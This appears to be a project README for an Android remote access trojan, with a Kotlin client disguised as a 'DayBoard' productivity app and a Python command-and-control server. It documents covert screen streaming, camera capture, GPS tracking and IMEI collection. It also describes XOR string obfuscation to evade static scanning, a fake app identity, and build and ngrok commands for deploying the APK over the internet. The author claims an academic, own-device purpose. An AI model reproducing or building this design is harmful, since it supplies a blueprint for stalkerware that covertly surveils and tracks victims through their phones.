Overview

Android RAT built from first principles. Kotlin client disguised as a productivity app ("DayBoard"), Python C2 server with desktop GUI and Discord relay. Communicates over VADER protocol — 4-byte big-endian length-prefixed JSON over raw TCP. Zero third-party C2 frameworks.

Built for CSEC academic research, own devices only. Validated against Samsung Galaxy S10e (SM-G970U) running One UI 4 / Android 12. Fully automated test suite from locked-phone state.

VADER Protocol

// Every message: 4-byte big-endian length prefix + UTF-8 JSON body
// Agent → C2 on connect:
{ "type": "register", "hostname": "SM-G970U", "model": "samsung SM-G970U", "battery": 100 }

// C2 → Agent task dispatch:
{ "type": "task", "task_id": "a3f9b1", "op": "vnc", "frames": 5, "interval": 500 }

// Agent → C2 result:
{ "type": "result", "task_id": "a3f9b1", "data": { "frame": 0, "data": "<base64 JPEG>" } }

// Agent → C2 heartbeat (every 30s):
{ "type": "heartbeat", "battery": 98, "timestamp": 1750000000000 }

Android Client — File Map

Config.kt
Runtime-injected constants. C2_HOST, C2_PORT, APP_NAME written by build.py before Gradle compiles. Never committed with real values.
Crypt.kt
XOR obfuscation for string literals. KEY=0x5A, XOR with (KEY + i%7) rotation. All op-code strings in Dispatcher.kt are encoded — k("...") decodes at runtime. Prevents static string scanning.
SyncService.kt
Foreground service. Owns the TCP connection, wake lock, battery optimisation exemption. Foreground type: DATA_SYNC | MEDIA_PROJECTION — required for Android 12 MediaProjection API call. ACTION_ACTIVATE_MP intent handler for projection setup.
SyncAdapter.kt
TCP socket I/O. Implements VADER framing: 4-byte big-endian length + JSON body. sendResult(), sendHeartbeat(), sendFileData(). Handles disconnection, reconnect backoff (base 2s, max 60s).
Dispatcher.kt
Receives task JSON, routes by op to module methods. Thread pool (4 threads). All op-code strings are XOR-encoded. Catch-all sends error JSON. Lazy module initialisation.
GrantActivity.kt
Single-use MediaProjection consent activity. FLAG_ACTIVITY_NEW_TASK + FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS. On RESULT_OK: sends ACTION_ACTIVATE_MP intent to SyncService — projection setup runs inside foreground service, survives Activity.finish().
AccessService.kt
AccessibilityService backend. Samsung One UI 4 strips CAPABILITY_CAN_TAKE_SCREENSHOT — RuntimeException caught, returns null, falls back to MediaProjection. instance volatile ref for isAvailable() checks.
CoverActivity.kt
User-visible UI. "DayBoard" productivity cover. Launches SyncService. Handles first-run permissions: CAMERA, AUDIO, LOCATION, STORAGE. Battery optimisation exemption. Accessibility shortcut settings navigation.
DisplayHelper.kt
VNC + screenshot engine. MediaProjection → VirtualDisplay → ImageReader pipeline. Samsung VD lazy-update fix: lastFrame cache, poll(2s) with fallback. VNC stream sends N frames as intermediate results then stream_done. acc→MP fallback when captureFrame() returns null.
PhotoHelper.kt
Camera2 API. CameraManager → CameraDevice → ImageReader. Front/back selection by LENS_FACING. Single shot: ImageReader.acquireLatestImage() → JPEG ByteArray. Cleans up CameraDevice on completion.
LocProvider.kt
GPS + network location. Last known first (fast path). Falls back to requestSingleUpdate with Looper.getMainLooper() — required when called from thread pool. 15s CountDownLatch wait.
SysInfo.kt
Device fingerprint: model, manufacturer, Android version, IMEI (READ_PHONE_STATE), WiFi SSID (ACCESS_WIFI_STATE), IP address, battery level via BatteryManager.

Build Pipeline

# 1. Inject C2 address into Config.kt
python build.py --ip <C2_IP> --port <PORT> --name <APP_NAME>

# 2. build.py does:
#    a) Write Config.kt with C2_HOST / C2_PORT / APP_NAME constants
#    b) Update app/build.gradle.kts applicationId for namespace isolation
#    c) Run: gradlew.bat assembleDebug
#    d) Copy APK to payloads/starkiller-debug.apk

# 3. Install + run (ADB)
adb install -r payloads/starkiller-debug.apk
adb shell am start -n com.georgetech.filesync/.CoverActivity

# 4. Production: WAN deploy via ngrok
ngrok tcp 8667           # get 0.tcp.au.ngrok.io:PORT
python build.py --ip 0.tcp.au.ngrok.io --port <PORT> --name DayBoard

Obfuscation Layer

XOR String Encoding
All op-codes and sensitive string literals in Dispatcher.kt encoded with Crypt.e(). Decoded at runtime via k() → Crypt.d(). Prevents static string grep for "camera", "gps", etc.
Cover Identity
App name: DayBoard (productivity widget). Service label: Screen Assist. Notification: "Syncing". Package: com.georgetech.filesync. Appears as a sync/productivity app.
Build-time Injection
C2 IP/port baked in at compile time via Config.kt. No hardcoded server strings in APK defaults — placeholder values only. build.py overwrites before Gradle runs.
